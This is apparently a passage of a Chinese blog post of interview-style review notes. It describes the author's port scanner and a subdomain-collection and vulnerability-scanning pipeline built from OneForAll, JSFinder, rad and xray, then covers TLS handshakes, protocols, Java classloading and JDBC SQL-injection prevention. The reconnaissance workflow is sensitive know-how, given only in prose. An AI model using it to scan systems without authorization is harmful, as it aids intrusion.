<p>   首先呢就是判断输入的是域名还是IP，是域名的话就会先将域名解析成IP，然后判断输入的是指定端口个数，还是端口范围；再分别对各端口进行TCP连接，并且获取端口对应的服务信息；如果是指定了端口号，将连接成功的端口号输出标为open，连接失败的输出标为close；如果是端口范围，则只输出连接成功的端口号；端口扫描完后会输出一共开放的端口个数，以及本次扫描一共用了多长时间。</p>
<p>优化：提高扫描效率，丰富扫描结果。<br>   nmap缺点：扫描速度慢<br>   masscan：只能扫描端口</p>
<h3 id="varscanner"><a href="#varscanner" class="headerlink" title="varscanner"></a>varscanner</h3><p>接收一个参数，可以是单个域名，也可以是一个包含多个域名的文件；<br>首先使用oneforall进行子域名收集，将生成的csv文件中的subdomain那一列的子域名提取出来，保存到一个txt文件中，并去重；<br>然后分别向这些网站发送request请求，将访问失败的子域名去掉，只留下有用的；<br>再用JSFinder对网站进行深度扫描，将爬取的子域名添加到oneforall扫出来的子域名文件中，以补充oneforall没有扫出的子域名，然后再去重；<br>这样就收集到了比较完整的子域名了；<br>然后开启xray监听，使用rad爬虫爬取网站的数据，代理到xray上，结合rad高速爬虫和xray的漏洞扫描，实现更高效的扫描。</p>
<p>对多个工具进行集成，更方便自己使用。<br>缺点：效率不怎么高</p>
<h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h2><p>TCP&#x2F;IP网络分层模型：网络接口层——网际层——传输层——应用层<br>OSI七层模型：物理层——数据链路层——网络层——传输层——会话层——表示层——应用层<br>五层协议体系结构：物理层——数据链路层——网络层——传输层——应用层<br><strong>一、浏览器解码顺序</strong><br>URL、HTML、CSS、JS</p>
<h3 id="HTTPS握手过程"><a href="#HTTPS握手过程" class="headerlink" title="HTTPS握手过程"></a>HTTPS握手过程</h3><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000021494676">https://segmentfault.com/a/1190000021494676</a></p>
<ol>
<li>客户端向服务端发起请求，服务端响应请求，将CA证书发送给客户端，证书中包含公钥（和其他相关信息）；</li>
<li>客户端解析证书，确认证书的真假和有效性，如果证书不可信或者已过期，浏览器会弹出警告询问是否继续通信；</li>
<li>证书没问题的话，客户端就会取出证书中的公钥，使用公钥对一个随机生成的密钥值加密并发送给服务端，这个密钥作为后门通信中对称加密的密钥；</li>
<li>服务端收到加密密钥后使用私钥对其解密，这样双方都拥有了对称加密的密钥，可以使用对称加密进行数据传输了。</li>
</ol>
<p><strong>HTTP与HTTPS的区别：</strong></p>
<ol>
<li>HTTP是明文传输，安全性较差；HTTPS是加密传输，安全性较高；</li>
<li>HTTPS需要申请CA证书；</li>
<li>HTTP页面响应速度比HTTTPS快，因为HTTPS通信过程更复杂；</li>
<li>HTTPS更耗费服务器资源，因为构建在SSL&#x2F;TLS之上的HTTP协议；</li>
<li>连接的端口不一样，443，80</li>
</ol>
<p><strong>SSL&#x2F;TLS握手过程：</strong></p>
<ol>
<li>客户端发起请求，请求中包含客户端所支持的TLS版本和多种密码组合，以及一个随机字符串；</li>
<li>服务端响应请求，响应包中包含数字证书，服务端所选择的密码组合，以及一个随机字符串；</li>
<li>客户端对证书进行验证，判断是否合法，确认过后向服务器发送一个经公钥加密的随机字符串；</li>
<li>服务端使用私钥将随机字符串解密，然后客户端和服务端将三个随机字符串使用相同的算法生成一个新的密钥；</li>
<li>双方互相发送新密钥生成的结束信号，握手完成，就可以使用新密钥进行对称加密通信了。</li>
</ol>
<h3 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h3><p>基于TCP：FTP、Telent、SMTP、HTTP、POP3、SSH<br>基于UDP：DNS、TFTP简单文件传输协议、RIP路由选择协议、DHCP、IGMP</p>
<p>  TCP：传输控制协议，面向连接，提供可靠的数据传输，建立传输通道，超时重传，一对一连接，三次握手，四次挥手。<br>  UDP：用户数据报协议，面向无连接，数据不可靠传输，不提供报文到达确认，多对一，一对多，一对一，不需要建立通道和关闭通道；传输速度快。</p>
<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><p>对称加密：AES、DES、3DES<br>非对称加密：RSA、DSA数字签名用、ECC椭圆曲线密码编码学<br>hash算法-单向加密：MD2 4 5，SHA -1</p>
<h2 id="工具原理"><a href="#工具原理" class="headerlink" title="工具原理"></a>工具原理</h2><h3 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h3><p><a target="_blank" rel="noopener" href="https://jishuin.proginn.com/p/763bfbd72b66">https://jishuin.proginn.com/p/763bfbd72b66</a><br>子域名收集方式：</p>
<ul>
<li>字典爆破</li>
<li>利用证书透明度收集</li>
<li>利用网上爬虫档案收集</li>
<li>利用DNS数据收集</li>
<li>利用DNS查询收集</li>
<li>利用威胁情报平台数据收集</li>
<li>利用搜索引擎</li>
</ul>
<p>支持泛域名解析</p>
<h3 id="Rad"><a href="#Rad" class="headerlink" title="Rad"></a>Rad</h3><p><a target="_blank" rel="noopener" href="http://cn-sec.com/archives/116327.html">http://cn-sec.com/archives/116327.html</a><br>一款浏览器爬虫。模仿人的行为，触发JS对应的操作。<br>  浏览器爬虫的难点并不是在于发现页面上的已经由后端渲染的 Url 或者其他资源链接，而是加载 JS；并且按照“人”的逻辑，触发 JS 对应的操作。然而这些操作会对页面产生一些“无法预料”的影响。所以，进行 Human-Like 的 JS 行为触发，并捕捉出发 JS 导致的变化和过程中产生的 HTTP 请求，其实才是实现浏览器爬虫的难点。</p>
<p><strong>rad+xray：</strong><br>整体系统启动之后，rad 会将流量输入到 MITM 桥接代理链，代理链将镜像流量存入数据库，并同时转发到 xray；xray 进行漏洞扫描，webhook 将漏洞扫描结果输入到系统漏洞库中。</p>
<p><strong>有什么资产：</strong><br>主机、端口、服务等；而服务的细分版本、指纹；如果这个服务是 Web 应用，那么对应的域名、网站结构也是资产。<br>还有：<br>  没有对应 web 服务(也可能是没有扫描到的)的域名；<br>  挖掘网站结构时候产生的 HTTP 请求和响应；</p>
<p>  从网站相关的 HTTP 请求和响应中挖掘出的网站可能的信息：<br>        网站的开发语言<br>        第三方开发组件<br>        JS库等<br>        网站暴露的一些手机号、邮箱等信息</p>
<h2 id="Classloader类加载机制"><a href="#Classloader类加载机制" class="headerlink" title="Classloader类加载机制"></a>Classloader类加载机制</h2><p>分为显式和隐式，显式指通过反射或调用Classloader来加载类；隐式指通过<code>类名.方法名</code>和 new 来加载。<br>加载流程：</p>
<ul>
<li>调用 findLoadedClass 检查该类是否已经初始化，若已经初始化，就直接返回该类的对象；</li>
<li>若没有就使用父类加载器或 Bootstrap ClassLoader 加载</li>
<li>若加载不到就调用自身的 findClass</li>
</ul>
<h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>流程：</p>
<ul>
<li>先注册驱动&#96;public interface Driver</li>
<li>然后建立连接，返回一个连接对象； <code>DriverManager.getConnection(xxx)</code></li>
<li>创建Statement对象，执行 SQL 语句</li>
<li>如果式查询语句，就创建ResultSet对象保存查询结果</li>
</ul>
<p><strong>Statement 和 PrepareStatement的区别：</strong><br>Statement 是将用户传入的参数插入后再执行 sql 语句，每次执行sql 语句都要进行重新编译一次，这样存在 sql 注入的风险；<br>PrepareStatement 可以先用占位符对传参的位置进行占位，进行编译，当用户传入参数后，将参数插入进去，然后执行；只用编译一次，能有效防止 sql 注入。</p>
<h3 id="数据库连接池"><a href="#数据库连接池" class="headerlink" title="数据库连接池"></a>数据库连接池</h3><p>建立一个缓冲池，预先向池子中放入若干连接对象，需要连接数据库的时候就直接从连接池中获取连接对象，不用再重新注册驱动和建立连接；用完又把对象放回连接池中<br>常见的数据源有：DBCP、C3P0、Druid、Mybatis DataSource，他们都实现于<code>javax.sql.DataSource</code>接口。</p>
<p>将连接池的配置信息写到配置文件中，避免每次修改连接信息都重新编译 Java 文件；</p>
<p><strong>DBUtils：</strong>  他的<code>query()</code>封装了创建 Statement 、编译执行sql语句、结果返回等操作</p>
<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2>
      </div>
    </div>
</div>


<div class="post-footer">
  

  <div class="post-copyright">
    <p style="margin: 5px 0;">文章作者：<a href="/">blckder02</a></p>
    <p style="margin: 5px 0;">文章链接：<a href="http://www.blckder02.cn/2022/09/16/%E5%A4%8D%E4%B9%A0/">http://www.blckder02.cn/2022/09/16/%E5%A4%8D%E4%B9%A0/</a></p>
    <p style="margin: 5px 0;">版权声明：</p>
  </div>
  
</div>

    <!-- Comments -->
    <div class="comments">
        
        
    </div>

</article>


        </div>
        
<footer class="text-center">
    
    
    
    
    
    <p>&copy;  2020 - 2021&nbsp;&nbsp;Theme Miracle</p>
    
    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme by <a href="https://github.com/hifun-team/hexo-theme-miracle" target="_blank">Miracle</a></p>
    
    
</footer>

<div class="p-btn">
    
        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
    
    <a href="#top" class="click-btn">
      <i id="i-up"></i>
    </a>
</div>

<!-- SCRIPTS -->







<script>
    document.getElementById("btn-dropdown").addEventListener('click', () => {
      toggleClass("#dropdown-menus","display-inline");
    });
    console.log('\n' + ' %c Powered by Hexo Theme Miracle ' + ' %c https://github.com/hifun-team/hexo-theme-miracle ' + '\n' + '\n', 'color: #fff; background: #4F9BFA; padding:5px 0;', 'background: #FFF; padding:5px 0;');

    

    
      document.addEventListener('copy', function (event) {
      const clipboardData = event.clipboardData || window.clipboardData;
      if (!clipboardData) { return; }
      const text = window.getSelection().toString();
      if (text) {
        event.preventDefault();
        clipboardData.setData('text/plain', text + '本文章由 blckder02 撰写，转载请注明来源喔。');
      }
    });
    
  /* 小彩蛋: 饮茶先啦 */
  setTimeout(() => {
    var time = new Date();
    if (time.getHours() == 15) {
      let comment = document.createComment(' 三点几嚟！饮茶先啦！ ');
      document.body.insertBefore(comment, document.getElementsByTagName('header')[0]);
    }
  },1);
    
</script>


<script>
    var postImg = document.querySelectorAll("article[class=page] img");
    for (let imgi = 0; imgi < postImg.length; imgi++) {
        postImg[imgi].onclick = () => {
            let zoomImg = document.createElement("div");
            zoomImg.id = "zoomImg";
            zoomImg.innerHTML = `<div id="zoom-picture"></div>
    <div class="poptrox-overlay"
        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
        <div
            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
        </div>
        <div class="poptrox-popup"
            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
            <div class="loader" style="display: none;"></div>
            <div class="pic" style="text-indent: 0px;"><img
                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
        </div>
    </div>`;
            document.body.appendChild(zoomImg);
                document.querySelector("#zoomImg").onclick = () => {
                    document.querySelector("#zoomImg").remove();
                }
        }
    }
    
</script>




    <script>
        query("#toc-btn")[0].onclick = () => {
            if (query(".post-toc")[0].innerHTML) {
                toggleClass(".post-toc", "display-inline");
            }
        }

        if (!query(".post-toc")[0].innerHTML) {
            addClass("#toc-btn","display-none");
        }
    </script>









        </div>
        <div id="css-loading">
            <h3 class="text-center">加载中...</h3>
        </div>
        
    </body>
</html>
